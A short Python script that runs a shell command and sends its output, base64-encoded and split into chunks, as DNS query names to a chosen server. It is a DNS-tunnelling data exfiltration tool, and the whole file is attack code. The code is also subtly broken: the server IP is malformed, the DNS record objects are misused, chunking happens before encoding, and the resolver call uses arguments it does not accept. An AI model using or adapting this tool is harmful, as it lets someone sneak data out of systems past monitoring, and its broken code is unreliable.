import subprocess
import base64
import dns.resolver
from dnslib import DNSRecord, QTYPE, A

# Chunk size for splitting data
CHUNK_SIZE = 63

# DNS server and query type
DNS_SERVER = '192.168.6'  # Replace with your DNS server IP
QUERY_TYPE = 'A'  # Replace with your desired query type (e.g., A, AAAA, MX, etc.)

# Encrypt data using base64 encoding
def encrypt_data(data):
    encrypted_data = base64.b64encode(data.encode()).decode()
    return encrypted_data

# Split data into chunks
def chunk_data(data, chunk_size):
    chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

# Send data chunks using DNS resolution
def send_chunks(chunks):
    for chunk in chunks:
        qname = encrypt_data(chunk)
        query = DNSRecord(q=DNSRecord(q=qname, qtype=QTYPE[QUERY_TYPE]))
        try:
            response = dns.resolver.query(str(query.q.qname), QUERY_TYPE, raise_on_no_answer=False, tcp=False, udp=True, port=53, timeout=5, lifetime=5, nameservers=[DNS_SERVER])
            if response.rr:
                for rr in response.rr:
                    decrypted_data = base64.b64decode(str(rr.rdata))
                    print(decrypted_data.decode(), end='')
        except dns.resolver.NXDOMAIN:
            print("DNS resolution failed for", qname)

# Run subprocess command and send output in chunks
def send_subprocess_output(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    output = process.communicate()[0].decode()
    chunks = chunk_data(output, CHUNK_SIZE)
    send_chunks(chunks)

# Example usage
command = "ls -l"  # Replace with your desired subprocess command
send_subprocess_output(command)
